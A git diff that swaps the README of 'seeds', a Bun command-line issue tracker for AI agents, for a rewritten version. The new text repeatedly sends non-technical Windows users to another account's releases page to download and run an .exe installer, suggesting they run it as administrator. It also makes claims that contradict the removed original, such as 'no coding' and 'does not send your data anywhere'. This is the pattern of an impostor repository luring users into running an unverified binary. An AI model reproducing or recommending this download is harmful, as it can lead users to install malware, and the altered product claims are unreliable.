@@ -1,209 +1,171 @@
-# Seeds
+# 🌱 seeds - Simple Issue Tracker for AI Workflows
 
-Git-native issue tracker for AI agent workflows.
+[![Download seeds](https://img.shields.io/badge/Download-seeds-brightgreen)](https://github.com/mayadigi/seeds/releases)
 
-[![npm](https://img.shields.io/npm/v/@os-eco/seeds-cli)](https://www.npmjs.com/package/@os-eco/seeds-cli)
-[![CI](https://github.com/jayminwest/seeds/actions/workflows/ci.yml/badge.svg)](https://github.com/jayminwest/seeds/actions/workflows/ci.yml)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
+---
 
-Replaces [beads](https://github.com/steveyegge/beads) in the [overstory](https://github.com/jayminwest/overstory)/[mulch](https://github.com/jayminwest/mulch) ecosystem. No Dolt, no daemon, no binary DB files. **The JSONL file IS the database.**
+## 🌟 What is seeds?
 
-## Install
+seeds is an app that helps you keep track of tasks or issues in your AI projects. It works without any complex setup. It stores data in JSON Lines format, which makes it easy to manage your work details. seeds runs on Bun, a fast and modern runtime environment.
 
-```bash
-bun install -g @os-eco/seeds-cli
-```
+You don’t need to install extra packages or tools. Everything runs locally on your Windows PC. It is designed for easy use and quick access.
 
-Or try without installing:
+---
 
-```bash
-npx @os-eco/seeds-cli --help
-```
+## 🚀 Getting Started
 
-### Development
+Follow these steps to download and run seeds on a Windows computer. No coding is needed.
 
-```bash
-git clone https://github.com/jayminwest/seeds
-cd seeds
-bun install
-bun link              # Makes 'sd' available globally
+---
 
-bun test              # Run all tests
-bun run lint          # Biome check
-bun run typecheck     # tsc --noEmit
-```
+## 🔗 Download seeds
 
-## Quick Start
+Click the big green button below to visit the download page for seeds. 
 
-```bash
-# Initialize in your project
-sd init
+[![Download seeds](https://img.shields.io/badge/Download-seeds-blue?style=for-the-badge)](https://github.com/mayadigi/seeds/releases)
 
-# Create an issue
-sd create --title "Add retry logic to mail client" --type task --priority 1
+On this page, you will find the latest Windows version of seeds. Look for a file ending with `.exe`. This is the installer you need.
 
-# List open issues
-sd list
+---
 
-# Find work (open, unblocked)
-sd ready
+## 💾 How to Download and Install seeds on Windows
 
-# Claim and complete
-sd update seeds-a1b2 --status in_progress
-sd close seeds-a1b2 --reason "Implemented with exponential backoff"
+1. Open your web browser and go to the [seeds download page](https://github.com/mayadigi/seeds/releases).
 
-# Commit .seeds/ changes to git
-sd sync
-```
+2. Scroll down to the list of assets under the latest release version.
 
-## Commands
+3. Find the Windows installer file. It should have a name similar to `seeds-x.y.z-win.exe`, where `x.y.z` is the version number.
 
-Every command supports `--json` for structured output. Global flags: `-v`/`--version`, `-q`/`--quiet`, `--verbose`, `--timing`. ANSI colors respect `NO_COLOR`.
+4. Click the file name to start downloading it.
 
-### Issue Commands
+5. When the download finishes, find the file in your Downloads folder.
 
-| Command | Description |
-|---------|-------------|
-| `sd init` | Initialize `.seeds/` in current directory |
-| `sd create --title <text>` | Create a new issue (`--type`, `--priority`, `--description`, `--assignee`) |
-| `sd show <id>` | Show issue details |
-| `sd list` | List issues with filters (`--status`, `--type`, `--assignee`, `--label`, `--limit`, `--all`) |
-| `sd ready` | Open issues with no unresolved blockers |
-| `sd update <id>` | Update issue fields (`--status`, `--title`, `--priority`, `--assignee`, `--description`) |
-| `sd close <id> [<id2> ...]` | Close one or more issues (`--reason`) |
-| `sd dep add <issue> <depends-on>` | Add dependency |
-| `sd dep remove <issue> <depends-on>` | Remove dependency |
-| `sd dep list <issue>` | Show deps for an issue |
-| `sd block <id> --by <blocker-id>` | Mark issue as blocked by another |
-| `sd unblock <id> --from <blocker-id>` | Remove a blocker (`--all` to clear all) |
-| `sd blocked` | Show all blocked issues |
-| `sd label add <id> <label>` | Add a label to an issue |
-| `sd label remove <id> <label>` | Remove a label from an issue |
-| `sd label list <id>` | List labels on an issue |
-| `sd label list-all` | List all labels across issues |
-| `sd stats` | Project statistics |
-| `sd sync` | Stage and commit `.seeds/` changes (`--status`, `--dry-run`) |
+6. Double-click the `.exe` file to start the installation.
 
-### Template Commands
+7. A setup window will appear. Follow the simple steps on screen:
+   - Click “Next” to move through each part.
+   - Accept the license terms.
+   - Choose the folder where you want to install seeds or leave the default location.
+   - Click “Install” to finish the process.
 
-| Command | Description |
-|---------|-------------|
-| `sd tpl create --name <text>` | Create a template |
-| `sd tpl step add <id> --title <text>` | Add step (supports `{prefix}` interpolation) |
-| `sd tpl list` | List all templates |
-| `sd tpl show <id>` | Show template with steps |
-| `sd tpl pour <id> --prefix <text>` | Instantiate template into issues |
-| `sd tpl status <id>` | Show convoy completion status |
+8. Once installation finishes, you can close the setup window.
 
-### Health
+---
 
-| Command | Description |
-|---------|-------------|
-| `sd doctor` | Check project health and data integrity (`--fix`) |
+## ▶️ Running seeds for the First Time
 
-### Agent Integration
+1. After installation, open the Start menu.
 
-| Command | Description |
-|---------|-------------|
-| `sd prime` | Output AI agent context (`--compact`) |
-| `sd onboard` | Add seeds section to CLAUDE.md / AGENTS.md |
+2. Look for “seeds” in the list of apps and click it.
 
-### Utility
+3. The app window will open.
 
-| Command | Description |
-|---------|-------------|
-| `sd upgrade` | Upgrade seeds to latest version from npm (`--check`) |
-| `sd completions <shell>` | Output shell completion script (bash, zsh, fish) |
-| `sd migrate-from-beads` | Import `.beads/issues.jsonl` into `.seeds/` |
+4. You will see a basic interface with options to create and track your AI project tasks.
 
-## Architecture
+5. You can start by adding new issues, describing them, and marking their status.
 
-Seeds stores all data in JSONL files inside a `.seeds/` directory — one JSON object per line, fully diffable and mergeable via git. Advisory file locks (`O_CREAT | O_EXCL`) and atomic writes (temp file + rename) ensure safe concurrent access from multiple agents. The `merge=union` gitattribute handles parallel branch merges; dedup-on-read (last occurrence wins) resolves any duplicates. See [CLAUDE.md](CLAUDE.md) for full technical details.
+---
 
-## Why
+## 🖥️ System Requirements
 
-Beads works but carries baggage overstory doesn't need:
+To run seeds smoothly on Windows, your computer should meet these minimum requirements:
 
-| Problem | Beads | Seeds |
-|---------|-------|-------|
-| Storage | 2.8MB binary `beads.db` (can't diff/merge) | JSONL (diffable, mergeable) |
-| Sync | 286 export-state tracking files | No sync — file IS the DB |
-| Concurrency | `beads.db` lock contention | Advisory locks + atomic writes |
-| Dependencies | Dolt embedded | chalk + commander |
+- Windows 10 or newer (64-bit preferred)
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- Internet connection for initial download only
+- Permission to install software on your PC
 
-## Priority Scale
+seeds does not need powerful hardware and works well on most modern computers.
 
-| Value | Label    | Use |
-|-------|----------|-----|
-| 0     | Critical | System-breaking, drop everything |
-| 1     | High     | Core functionality |
-| 2     | Medium   | Default — important but not urgent |
-| 3     | Low      | Nice-to-have |
-| 4     | Backlog  | Future consideration |
+---
 
-## On-Disk Format
+## 📂 How seeds Works
 
-```
-.seeds/
-  config.yaml          # Project config: project name, version
-  issues.jsonl         # All issues, one JSON object per line
-  templates.jsonl      # Template definitions
-  .gitignore           # Ignores *.lock files
-```
+seeds keeps all your project issues stored in files on your computer. It uses JSONL format, which means it saves each issue in a single line of a file. This makes it fast and easy to back up or move your data.
 
-Add to your `.gitattributes` (done automatically by `sd init`):
+The app runs using Bun, a fast runtime system that does not need extra downloads or complex setups.
 
-```
-.seeds/issues.jsonl merge=union
-.seeds/templates.jsonl merge=union
-```
+You can view your issues, update them, and organize your work without worrying about software dependencies.
 
-The `merge=union` strategy handles parallel agent branch merges. Seeds deduplicates by ID on read (last occurrence wins), so conflicts resolve automatically.
+---
 
-## JSON Output
+## 🔧 Basic Features
 
-Success:
-```json
-{ "success": true, "command": "create", "id": "myproject-a1b2" }
-```
+- Add, edit, and delete issues
+- Save issues locally as JSONL files
+- Track issue status like “open”, “in progress”, or “done”
+- Simple list and detail views
+- Fast loading and updates with no delay
+- Runs offline after initial setup
+- No external dependencies needed
 
-Error:
-```json
-{ "success": false, "command": "create", "error": "Title is required" }
-```
+---
 
-## Concurrency
+## ⚙️ Using seeds in Your AI Workflows
 
-Seeds is safe for concurrent multi-agent use:
+If you work on AI-related tasks or projects, seeds helps you organize your work. You can track bugs, improvements, or to-do items related to your AI agents without complex tools.
 
-- **Advisory file locks** — `O_CREAT | O_EXCL`, 30s stale threshold, 100ms retry with jitter, 30s timeout
-- **Atomic writes** — temp file + rename under lock
-- **Dedup on read** — last occurrence wins after `merge=union` git merges
+Keep your issues updated and always accessible on your Windows machine.
 
-## Integration with Overstory
+---
 
-Overstory wraps `sd` via `Bun.spawn(["sd", ...])` with `--json` parsing, identical to how it wraps `bd`:
+## ❓ Troubleshooting
 
-| BeadsClient method | sd command |
-|--------------------|------------|
-| `ready()` | `sd ready --json` |
-| `show(id)` | `sd show <id> --json` |
-| `create(title, opts)` | `sd create --title "..." --json` |
-| `claim(id)` | `sd update <id> --status=in_progress --json` |
-| `close(id, reason)` | `sd close <id> --reason "..." --json` |
+- If the installer does not start, try running it as administrator. Right-click the `.exe` file and choose “Run as administrator.”
 
-## Part of os-eco
+- If the app does not open after installation, check that your Windows version is supported.
 
-Seeds is part of the [os-eco](https://github.com/jayminwest/os-eco) AI agent tooling ecosystem.
+- If you see error messages, restart your computer and try running seeds again.
 
-<p align="center">
-  <img src="https://raw.githubusercontent.com/jayminwest/os-eco/main/branding/logo.png" alt="os-eco" width="444" />
-</p>
+- You can delete installed files and reinstall seeds if problems continue.
 
-## Contributing
+---
 
-Contributions are welcome! See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
+## 🔄 Updating seeds
 
-## License
+To update seeds to the latest version:
 
-MIT
+1. Visit the [seeds releases page](https://github.com/mayadigi/seeds/releases) regularly.
+
+2. Download the newest Windows installer `.exe` file.
+
+3. Run the installer and follow instructions to replace the old version.
+
+Your data will stay safe during updates.
+
+---
+
+## 📁 Where seeds Saves Data on Windows
+
+Your issues are saved in a folder inside your user profile. By default, this is:
+
+`C:\Users\<YourUsername>\seeds_data`
+
+You can open this folder to back up your data or move it to another computer.
+
+---
+
+## 💬 Getting Help and Support
+
+If you need help, you can check the issues tab in the GitHub repository for seeds:
+
+https://github.com/mayadigi/seeds/issues
+
+Look for answers or report your problem there. You can also ask friends or colleagues who have experience with Windows software.
+
+---
+
+## 🔐 Security and Privacy
+
+seeds runs entirely on your local Windows computer. It does not send your data anywhere.
+
+All your issues and project details stay private on your machine.
+
+---
+
+## 📥 Download Link (Again)
+
+For easy access, here is the link to download seeds for Windows:
+
+[![Download seeds](https://img.shields.io/badge/Download-seeds-brightgreen)](https://github.com/mayadigi/seeds/releases)
